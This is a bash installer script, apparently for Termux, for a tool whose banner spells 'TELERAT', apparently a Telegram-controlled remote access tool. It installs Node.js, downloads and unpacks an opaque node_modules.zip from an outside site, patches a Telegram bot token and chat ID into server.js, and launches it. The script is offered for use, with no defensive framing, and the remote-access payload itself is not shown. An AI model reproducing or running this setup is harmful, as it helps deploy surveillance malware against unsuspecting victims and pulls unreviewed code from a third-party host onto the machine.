#!/usr/bin/env bash

# Set terminal colors
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
RESET="\033[0m"

# Print banner
echo -e "${RED}████████╗███████╗██╗     ███████╗██████╗  █████╗ ████████╗
╚══██╔══╝██╔════╝██║     ██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
   ██║   █████╗  ██║     █████╗  ██████╔╝███████║   ██║   
   ██║   ██╔══╝  ██║     ██╔══╝  ██╔══██╗██╔══██║   ██║   
   ██║   ███████╗███████╗███████╗██║  ██║██║  ██║   ██║   
   ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝${RESET}"
echo -e "${YELLOW}               This TOol Created By./MR Abdo Elgokar${RESET}"
echo -e "                        "
echo -e "${GREEN}                           ✯✯✯✯✯✯${RESET}"
echo -e "                        "
echo -e "${GREEN}✵ Name: Abdo Elgokar${RESET}"
echo -e "${GREEN}✵ Github: https://github.com/MrJokar111${RESET}"
echo -e "${GREEN}✵ My Personal Telegram: Elgokar_1${RESET}"
echo -e "                        "
echo -n "Loading "
timeout 10s bash -c '
while true
do
    echo -n "."
    sleep 1
done
'
echo " Done!"


apt update && apt upgrade -y
if ! command -v node &> /dev/null
then
    echo "Node.js LTS not found. Installing..."
    pkg install nodejs-lts || { echo "Failed to install Node.js LTS" ; exit 1; }
else
    echo "Node.js LTS already installed"
fi
if ! command -v wget &> /dev/null
then
    echo "wget not found. Installing..."
    apt install -y wget || { echo "Failed to install wget" ; exit 1; }
else
    echo "wget already installed"
fi

if [ -d "node_modules" ]
then
    echo "node_modules already exists. Skipping download."
else
    if [ -f "node_modules.zip" ]
    then
        echo "node_modules.zip already downloaded. Skipping download."
    else
        # Download node_modules.zip file
        wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
    fi

    unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
    rm node_modules.zip
fi

read -p "Enter your bot token: " token
read -p "Enter your chat ID: " id
sed -i "s/const token = 'your token here'/const token = '$token'/g" server.js
sed -i "s/const id = 'chat id here'/const id = '$id'/g" server.js
echo "Server uploaded successfully! Now open new tab and follow rest instructions"
node server.js
